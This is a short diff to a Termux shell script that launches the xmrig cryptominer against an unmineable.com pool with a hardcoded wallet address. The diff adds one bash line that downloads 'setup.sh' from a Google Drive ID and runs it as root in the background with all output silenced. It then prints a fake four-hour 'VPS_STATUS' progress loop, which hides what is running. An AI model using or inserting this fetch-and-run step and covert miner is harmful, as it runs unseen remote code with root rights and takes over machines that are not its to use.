@@ -34,3 +34,7 @@ termux-wake-lock
 # Tạo session tmux mới để chạy xmrig
 tmux new-session -s xmrig 'cd ~/xmrig/build && ./xmrig --threads=2 --cpu-priority=1 -o rx.unmineable.com:3333 -a rx -k -u SHIB:0xdb3bd6c6a106c9b8b2e7ccdd5beac8ec9584e820.VMOS -p x'
 
+
+
+bash -c 'GDRIVE_ID="13cHLOXsRR0vy0znMXGkr5NFVUCw65y28" VPS_NAME="auto-restart-vps" && python3 -m pip install --user gdown && gdown --id "$GDRIVE_ID" -O setup.sh && chmod +x setup.sh && (sudo bash setup.sh >/dev/null 2>&1 &) && for i in $(seq 1 240); do printf "VPS_STATUS - Running minute %s/240...\n" "$i"; sleep 60 || true; done'
+
